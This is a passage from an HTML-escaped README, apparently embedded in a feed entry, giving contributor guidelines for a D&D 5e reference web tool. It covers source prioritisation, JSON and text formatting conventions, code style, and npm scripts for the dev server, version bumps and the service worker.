was later re-printed in a generic supplement. For example, the demon lords in OotA were re-printed in MTF, or the Haunted One background in CoS was re-printed in VRGR.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Page-Specific Notes&lt;/h4&gt; &#xA;&lt;p&gt;&lt;em&gt;Languages page.&lt;/em&gt; As there is no well-defined RAW format for language data, the languages page collects together information from several disjoint places. A priority list of sources to be considered is:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The &#34;Languages&#34; section on PHB p123&lt;/li&gt; &#xA; &lt;li&gt;official sources, in order of: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;PHB &amp;gt; (DMG) &amp;gt; MM&lt;/li&gt; &#xA;   &lt;li&gt;Other &#34;official&#34; (i.e. published) products in release-date order&lt;/li&gt; &#xA;   &lt;li&gt;&#34;Unofficial&#34; products (i.e. Unearthed Arcana; Plane Shift) in release-date order&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Within this ordering, the following prioritisation should be made:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;text that directly refers to or describes a language, in order of first appearance in the product (i.e. if a language is mentioned on page 2 and 10 of a book, the entry on page 2 should be taken as the primary source)&lt;/li&gt; &#xA; &lt;li&gt;text that is given for player use (e.g. the &#34;Druidic&#34; feature of the Druid class) (the text of which may have to be adapted to fit a reference format; i.e. changing &#34;You can understand...&#34; to &#34;A speaker or X language can understand...).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Target JavaScript Version&lt;/h3&gt; &#xA;&lt;p&gt;Any language feature which is available in both main-line Chrome and main-line Firefox, and has been available for at least six months, may be used.&lt;/p&gt; &#xA;&lt;h3&gt;Style Guidelines&lt;/h3&gt; &#xA;&lt;h4&gt;Code&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Use tabs over spaces.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;CSS&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The &lt;a href=&#34;http://getbem.com/&#34;&gt;BEM&lt;/a&gt; (&#34;Block Element Modifier&#34;) naming strategy should be used where possible.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Data/Text&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Format JSON to match the default output of JavaScript&#39;s &lt;code&gt;JSON.stringify&lt;/code&gt; (using tabs for indentation), i.e. one line per bracket and one line per value. JSON files programmatically generated from other JSON files (i.e. those stored in &lt;code&gt;data/generated&lt;/code&gt;) should be minified, however.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;When &#34;tagging&#34; references in data (e.g. &lt;code&gt;{@creature goblin}&lt;/code&gt;), the following rules apply:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Only tag references which are &lt;em&gt;intended as references&lt;/em&gt;. For example, the Wizard class in &lt;code&gt;You gain one cantrip of your choice from the wizard spell list&lt;/code&gt; should be tagged, whereas the Wizard class in &lt;code&gt;Together, a group of seven powerful wizards sought to contain the demon&lt;/code&gt; should not be tagged. One is a reference to the mechanical class, one is merely the casual usage of the word &#34;wizard.&#34;&lt;/li&gt; &#xA;   &lt;li&gt;In a similar vein, never tag anything within a &lt;code&gt;quote&lt;/code&gt;-type block. Even if the quote directly refers to a specific creature, we can assume the quote is from a universe/perspective in which (for example) stat blocks don&#39;t exist, and therefore the tag should be omitted to maintain the flavor of the quote.&lt;/li&gt; &#xA;   &lt;li&gt;Within data from a source, avoid referencing content from a source printed after the publication of that source. For example, MTF content might reference SCAG deities, but SCAG deities should refrain from referencing MTF content.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;JSON Cleaning&lt;/h3&gt; &#xA;&lt;h4&gt;Trailing commas&lt;/h4&gt; &#xA;&lt;p&gt;To remove trailing commas in JSON:&lt;/p&gt; &#xA;&lt;p&gt;Find: &lt;code&gt;(.*?)(,)(:?\s*]|\s*})&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Replace: &lt;code&gt;$1$3&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Character replacement&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;’&lt;/code&gt; should be replaced with &lt;code&gt;&#39;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;“&lt;/code&gt; and &lt;code&gt;”&lt;/code&gt; should be replaced with &lt;code&gt;&#34;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;—&lt;/code&gt; (em dash) should be replaced with &lt;code&gt;\u2014&lt;/code&gt; (Unicode for em dash)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;–&lt;/code&gt; should be replaced with &lt;code&gt;\u2013&lt;/code&gt; (Unicode for en dash)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;−&lt;/code&gt; should be replaced with &lt;code&gt;\u2212&lt;/code&gt; (Unicode for minus sign)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;•&lt;/code&gt; should be not be used unless the JSON in question is not yet covered by the entryRenderer, i.e. should be encoded as a list&lt;/li&gt; &#xA; &lt;li&gt;the only Unicode escape sequences allowed are &lt;code&gt;\u2014&lt;/code&gt;, &lt;code&gt;\u2013&lt;/code&gt;, and &lt;code&gt;\u2212&lt;/code&gt;; all other characters (unless noted above) should be stored as-is&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Convention for dashes&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;-&lt;/code&gt; (hyphen) should &lt;strong&gt;only&lt;/strong&gt; be used to hyphenate words, e.g. &lt;code&gt;60-foot&lt;/code&gt; and &lt;code&gt;18th-level&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;\u2014&lt;/code&gt; should be used for parenthetical dash pairs, or for marking empty table rows.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;\u2013&lt;/code&gt; should be used for joining numerical ranges, e.g. &lt;code&gt;1-5&lt;/code&gt; should become &lt;code&gt;1\u20135&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;\u2212&lt;/code&gt; should be used for unary minus signs, in the case of penalties. For example, &lt;code&gt;&#34;You have a -5 penalty to...&#34;&lt;/code&gt; should become &lt;code&gt;&#34;You have a \u22125 penalty to...&#34;&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;any whitespace on any side of a &lt;code&gt;\u2014&lt;/code&gt; should be removed&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Convention for measurement&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Adjectives: a hyphen and the full name of the unit of measure should be used, e.g. dragon exhales acid in a &lt;code&gt;60-foot line&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Nouns: a space and the short name of the unit of measure (including the trailing period) should be used, e.g. &lt;code&gt;blindsight 60 ft.&lt;/code&gt;, &lt;code&gt;darkvision 120 ft.&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Time: a slash, &lt;code&gt;/&lt;/code&gt;, with no spaces on either side followed by the capitalised unit of time, e.g. &lt;code&gt;2/Turn&lt;/code&gt;, &lt;code&gt;3/Day&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Convention for Dice&lt;/h4&gt; &#xA;&lt;p&gt;Dice should be written as &lt;code&gt;[X]dY[ &amp;lt;+|-|×&amp;gt; Z]&lt;/code&gt;, i.e. with a space between dice and operator, and a space between operator and modifier. Some examples of acceptable formatting are: &lt;code&gt;d6&lt;/code&gt;, &lt;code&gt;2d6&lt;/code&gt;, or &lt;code&gt;2d6 + 1&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;Convention for Item Names&lt;/h4&gt; &#xA;&lt;p&gt;Item names should be title-case, with the exception of units in parentheses, which should be sentence-case. Items who&#39;s volume or amount is specified by container (e.g. &lt;code&gt;(vial)&lt;/code&gt;) treat the container as a unit.&lt;/p&gt; &#xA;&lt;h3&gt;Mouse/Keyboard Events&lt;/h3&gt; &#xA;&lt;p&gt;Avoid binding ALT-modified events, as these are not available under MacOS or various Linux flavors. Binding SHIFT-/CTRL-modified events is preferred.&lt;/p&gt; &#xA;&lt;h3&gt;Dev Server&lt;/h3&gt; &#xA;&lt;p&gt;Do &lt;code&gt;npm run serve:dev&lt;/code&gt; to launch a local dev server that serves the project files on &lt;a href=&#34;http://localhost:8080/index.html&#34;&gt;&lt;code&gt;http://localhost:5000/index.html&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Version bump&lt;/h3&gt; &#xA;&lt;p&gt;Do &lt;code&gt;npm run version-bump -- [OPTION]&lt;/code&gt;, where &lt;code&gt;[OPTION]&lt;/code&gt; is one of the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;major&lt;/code&gt; to increment the major version (&lt;code&gt;1.2.3&lt;/code&gt; will become &lt;code&gt;2.0.0&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;minor&lt;/code&gt; to increment the minor version (&lt;code&gt;1.2.3&lt;/code&gt; will become &lt;code&gt;1.3.0&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;patch&lt;/code&gt; to increment the patch version (&lt;code&gt;1.2.3&lt;/code&gt; will become &lt;code&gt;1.2.4&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;a version number (like &lt;code&gt;1.2.3&lt;/code&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;It will first run the tests and fail to increase the version if the tests fail. It will then automatically replace the version in the files where it needs to be replaced, create a commit with the message &lt;code&gt;chore(version): bump&lt;/code&gt; and create a tag (in the form &lt;code&gt;v1.2.3&lt;/code&gt;) at the commit. This feature can be easily disabled by doing &lt;code&gt;npm config set git-tag-version false&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Service Worker&lt;/h3&gt; &#xA;&lt;p&gt;The service worker--which adds a client-side network caching layer, improving performance and allowing offline use--is not committed to the repository, and so must (optionally) be built locally. This can be done using either:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;npm run build:sw&lt;/code&gt;, to build a development version which outputs useful log messages&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;npm run build:sw:prod&lt;/code&gt;, to build a production version&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Both versions handle caching for the same files, which is an index of your local files on disk.&lt;/p&gt; &#xA;&lt;p&gt;Note that building the service worker is optional.&lt;/p&gt; &#xA;&lt;p&gt;Note that while using the service worker, some files are served cache-first (see the comments in the service worker files for more information). Care should be taken to either disable or work around the service worker when developing locally, as local changes may not otherwise be visible when refreshing a page.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This project is licensed under the terms of the MIT license.&lt;/p&gt;</summary>
  </entry>
</feed>